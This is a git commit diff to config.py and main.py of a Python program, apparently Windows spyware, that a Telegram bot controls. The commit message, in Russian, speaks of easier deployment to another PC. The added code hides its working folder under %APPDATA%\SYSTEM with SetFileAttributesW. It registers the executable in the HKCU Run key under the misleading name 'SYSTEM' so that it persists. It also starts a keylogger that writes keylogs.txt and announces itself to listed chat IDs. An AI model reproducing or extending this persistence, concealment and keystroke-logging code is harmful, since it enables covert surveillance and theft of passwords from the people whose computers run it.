cea8d74fe075960b0cf5e36a23cb163442917dfa
kripersi <kripersi1123@gmail.com>
2026-03-30 18:46:30 +0300

    Улучшил скрипт, сделал легкую скачку на другой ПК, улучшил инструкцию

--- config.py
+++ config.py
@@ -1,15 +1,22 @@
 import os
+import sys
 import telepot
+import ctypes
 
 # Основные настройки
 KNOWN_IDS = ['...']
-TOKEN = '...'
+TOKEN = '.................'
+
 bot = telepot.Bot(TOKEN)
+
+if getattr(sys, 'frozen', False):
+    BASE_DIR = os.path.join(os.environ['APPDATA'], 'SYSTEM')
+else:
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 # Пути
 USER = os.environ.get("USERNAME")
 APPDATA = os.environ.get("APPDATA")
-BASE_DIR = os.getcwd()
 LOG_DIR = os.path.join(BASE_DIR, 'logs')
 SCRIPTS_DIR = os.path.join(BASE_DIR, 'scripts')
 
@@ -17,6 +24,10 @@ SCRIPTS_DIR = os.path.join(BASE_DIR, 'scripts')
 LOG_FILE = os.path.join(LOG_DIR, 'user_log.txt')
 KEYLOG_FILE = os.path.join(LOG_DIR, 'keylogs.txt')
 
-# Убедимся, что папки существуют
 os.makedirs(LOG_DIR, exist_ok=True)
 os.makedirs(SCRIPTS_DIR, exist_ok=True)
+
+# Делаем скрытую папку
+FILE_ATTRIBUTE_HIDDEN = 0x02
+ctypes.windll.kernel32.SetFileAttributesW(BASE_DIR, FILE_ATTRIBUTE_HIDDEN)
+
--- main.py
+++ main.py
@@ -1,19 +1,53 @@
+import os
+import sys
+import time
+import winreg
+
 from telepot.loop import MessageLoop
 from config import bot, KNOWN_IDS
 from handlers import handle_message, send_safe_message
 from loggers import setup_logging, start_keylogger
-from time import sleep
+
+
+def add_to_startup():
+    try:
+        exe_path = os.path.abspath(sys.executable)
+
+        key = winreg.CreateKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run"
+        )
+
+        try:
+            winreg.QueryValueEx(key, "SYSTEM")
+        except FileNotFoundError:
+            winreg.SetValueEx(
+                key,
+                "SYSTEM",
+                0,
+                winreg.REG_SZ,
+                exe_path
+            )
+
+        winreg.CloseKey(key)
+
+    except Exception as e:
+        pass
 
 
 if __name__ == '__main__':
+    add_to_startup()
+
     setup_logging()
     start_keylogger()
+
     MessageLoop(bot, handle_message).run_as_thread()
 
     for chat_id in KNOWN_IDS:
         send_safe_message(chat_id, "Бот запущен")
 
     while True:
-        sleep(10)
+        time.sleep(10)
+
 
 
